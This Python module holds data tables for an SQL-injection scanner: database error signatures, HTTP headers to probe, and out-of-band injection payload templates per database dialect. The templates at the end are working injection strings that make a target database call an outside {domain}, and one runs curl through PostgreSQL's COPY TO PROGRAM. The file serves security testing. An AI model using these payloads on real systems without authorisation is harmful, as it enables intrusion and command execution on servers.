"""Static data tables for the SQLi detector.

Pure data only — no logic, no imports. Split out of detector.py so the
detector module stays focused on behavior and every table can be imported
(and membership-tested) independently.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Error signatures — comprehensive across 10+ DB engines
# ---------------------------------------------------------------------------

SQLI_ERROR_SIGNATURES: tuple[str, ...] = (
    # Generic / standards
    "sql syntax",
    "syntax error",
    "sqlstate",
    "database error",
    "query failed",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "conversion failed",
    # MySQL / MariaDB
    "mysql_fetch_array",
    "warning: mysql",
    "com.mysql.jdbc",
    "mariadb",
    "you have an error in your sql syntax",
    "check the manual that corresponds to your mysql server version",
    "extractvalue",
    "updatexml",
    # PostgreSQL
    "postgresql",
    "pg_query",
    "org.postgresql",
    "pg_exec",
    "syntax error at or near",
    "invalid input syntax for",
    "relation does not exist",
    "column does not exist",
    # Microsoft SQL Server
    "incorrect syntax near",
    "microsoft ole db",
    "microsoft sql server",
    "odbc driver",
    "driver [{",
    "unclosed quotation mark after the character string",
    "cannot resolve collation",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_step",
    "sqlite3.databaseerror",
    "no such column",
    "no such table",
    # Oracle
    "ora-00933",
    "ora-00921",
    "ora-00936",
    "ora-01756",
    "ora-00904",
    "ora-01403",
    "ora-",
    # IBM DB2, Informix, Sybase, H2, CockroachDB, Hibernate
    "db2 sql error",
    "sybase",
    "informix",
    "org.h2.jdbc",
    "cockroachdb",
    "org.hibernate",
    # Firebird
    "firebird",
    "gds",
    "dynamic sql error",
    "sql error code",
    # Ingres
    "ingres",
    "ingres sqlstate",
    # Neo4j
    "neo4j",
    "neo.ClientError",
    "cypher",
    # SAP HANA
    "sap hana",
    "hdb",
    "sql error:",
    # Vertica
    "vertica",
    "hsql",
    # Snowflake
    "snowflake",
    "snowflake.Error",
)

# HTTP headers that are commonly logged/stored as-is and executed raw SQL
INJECTABLE_HEADERS: tuple[str, ...] = (
    "User-Agent",
    "X-Forwarded-For",
    "X-Real-IP",
    "Referer",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Client-IP",
    "Forwarded",
    "X-Api-Key",
    "Authorization",
)

# OOB payloads per DB dialect — placeholders replaced with a live domain
OOB_TEMPLATES: dict[str, list[str]] = {
    "mssql": [
        "'; EXEC master..xp_dirtree '//{domain}/a'--",
        "'; EXEC master..xp_fileexist '//{domain}/a'--",
    ],
    "postgresql": [
        "'; COPY (SELECT '') TO PROGRAM 'curl http://{domain}'--",
        "' AND 1=(SELECT 1 FROM pg_read_binary_file('//{domain}/a'))--",
    ],
    "mysql": [
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', '{domain}', '\\\\a'))--",
        "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{domain}', '\\\\a'))--",
    ],
    "oracle": [
        "' UNION SELECT UTL_HTTP.REQUEST('http://{domain}') FROM DUAL--",
        "' AND 1=(SELECT 1 FROM dual WHERE UTL_HTTP.REQUEST('http://{domain}')='x')--",
    ],
    "db2": [
        "' AND 1=DB2LH.DOSFTP('http://{domain}')--",
        "' UNION SELECT DB2LH.DOSFTP('http://{domain}') FROM SYSIBM.SYSDUMMY1--",
    ],
    "snowflake": [
        "' AND 1=GET( 'http://{domain}/' )--",
    ],
    "hana": [
        "' AND 1=HTTP_GET_CLIENT( 'http://{domain}/' )--",
    ],
}
